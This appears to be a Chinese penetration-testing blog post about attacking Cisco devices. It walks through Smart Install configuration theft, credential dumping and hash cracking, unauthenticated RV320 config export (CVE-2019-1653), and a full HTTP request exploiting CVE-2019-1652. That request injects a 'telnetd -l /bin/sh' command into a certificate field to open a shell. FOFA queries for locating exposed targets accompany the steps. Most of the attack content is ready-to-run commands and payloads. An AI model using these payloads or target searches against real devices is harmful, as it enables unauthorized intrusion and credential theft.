> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [zhuanlan.zhihu.com](https://zhuanlan.zhihu.com/p/575576494?utm_id=0)

**声明：本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。**

作者： 小风筝

### 前言

在日常的渗透任务中，除了常见的集权设备，高危组件的漏洞挖掘，一些 iot 设备目标也是可以作为重点关注的存在。近期实战中遇到了几个 cisco 配置信息泄漏的案例，借此机会复习总结下 cisco 常见的漏洞。

### cisco **SMI 配置泄漏**

Cisco SMI 是一种即插即用功能，可为 Cisco 交换机提供零接触部署并在 TCP 端口 4786 上进行通信。如果发现开放 4786 端口的 cisco 设备，那可以深入测试一下。

fofa 语句 _protocol="smi"_

![](https://pic2.zhimg.com/v2-f5ec3e3e6650a7e148002e548e7aab95_r.jpg)

影响目标还挺多的

```
git clone https://github.com/ChristianPapathanasiou/CiscoSmartInstallExploit
cd CiscoSmartInstallExploit
pip2 install tftpy
python2 cisco.py [ip]

```

注意用 python2 运行, 运行成功会下载目标的运行配置

![](https://pic4.zhimg.com/v2-d73e09731363330941549c536cfb4523_r.jpg)

配置文件中存有设备用户密码，ACL 配置，ftp 配置账号密码等敏感信息

如果想进一步分析配置文件可以下载 ccat 工具进行自动化分析

[https://github.com/frostbits-security/ccat](https://link.zhihu.com/?target=https%3A//github.com/frostbits-security/ccat)

```
git clone https://github.com/frostbits-security/ccat.git
cd ccat
pip3 install -r requirements.txt
python3 ccat.py configuration_file

```

![](https://pic3.zhimg.com/v2-12c8226bde99e078fc63273b0501b94a_r.jpg)

我们可以使用 **--dump-creds** 参数 dump 出账号密码

![](https://pic4.zhimg.com/v2-88f3f7cacc8407ea2ba2c9047679d807_r.jpg)

文件名 m500 的可以用 hashcat -m 500 的掩码进行爆破, 5700 同理

![](https://pic4.zhimg.com/v2-66588f06c2ca288ed0261b8c2f7a3d37_r.jpg)

### CVE-2019-1652 && CVE-2019-1653

Cisco RV320 路由器的配置可以在未经身份验证的情况下通过设备的 Web 界面导出。

fofa 语句 app="CISCO-RV320”

对应 poc

```
ip:port/cgi-bin/config.exp

```

![](https://pic1.zhimg.com/v2-e416b2f4718122e2a1bc5ef0de838988_r.jpg)

下载的配置文件中有账号和 md5 的密码, 不过 md5 的格式为 `md5($password.$auth_key)`，其中 auth_key 是一个静态值，可以通过直接访问 / 路径找到。

![](https://pic1.zhimg.com/v2-70a036613407403da06487096b8e73c0_r.jpg)

当然在通过 CVE-2019-1653 获得了账号和 md5 的密码后可以通过替换登录包的 hash 进行登录, 无需解密

![](https://pic3.zhimg.com/v2-5a7969354ae200e486b0f1a1423ed706_r.jpg)![](https://pic3.zhimg.com/v2-5b393332eeca46fb8b9e980726fe6296_r.jpg)

后台可以配合 CVE-2019-1652 进行 rce

github 上的利用 poc 由于不支持目标的自签名证书 [https://github.com/0x27/CiscoRV320Dump/blob/master/easy_access.py](https://link.zhihu.com/?target=https%3A//github.com/0x27/CiscoRV320Dump/blob/master/easy_access.py) 这里就手动发包进行测试

```
POST /certificate_handle2.htm?type=4 HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: mlap=RGVmYXVsdDk6Ojo6Y2lzY28=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 319

page=self_generator.htm&totalRules=1&OpenVPNRules=30&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A&organization=A&organization_unit=A&email=ab%40example.com&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&SelectSubject_s=1&common_name=a%27%24%28telnetd%20-l%20%2Fbin%2Fsh%20-p%201337%29%27b

```

payload 执行后会用 telnet 在本地监听 1337 口

连接验证

![](https://pic1.zhimg.com/v2-915a8f638daeaab05987a55f083b2a74_r.jpg)

### 总结

1.  cisco 设备国内互联网公司和企事业用的不多，近年来都被国产品牌替换了。
2.  python 的 poc 经常会遇到一些历史遗留问题，比如 tls 版本过低，依赖库安装报错不兼容等等问题，建议还是用 go 写 poc，利人利己。